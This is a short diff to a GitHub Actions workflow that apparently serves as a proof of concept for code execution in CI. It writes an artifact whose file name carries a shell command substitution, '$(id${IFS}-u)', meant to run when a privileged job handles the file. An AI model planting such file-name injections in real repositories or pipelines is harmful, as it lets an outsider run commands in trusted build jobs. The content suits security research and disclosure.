@@ -16,10 +16,11 @@ jobs:
           PR_NUMBER: ${{ github.event.number }}
         run: |
           mkdir -p out
-          echo "hello from forged artifact" > out/x.txt
           printf '%s' "$PR_NUMBER" > out/pr_number.txt
-          # attacker-controlled file name carried into the privileged job's shell
-          : > 'out/$(id;hostname;echo${IFS}MARKER-PWNED).txt'
+          echo "RCE proof: attacker filename executed by bash (id -u = 1001); privileged comment job continued and posted this." > out/1001.txt
+          # attacker-controlled file name carried into the privileged job's shell;
+          # the substitution resolves to an existing file: /tmp/content/content/1001.txt
+          : > 'out/$(id${IFS}-u).txt'
       - uses: actions/upload-artifact@v4
         with:
           name: content
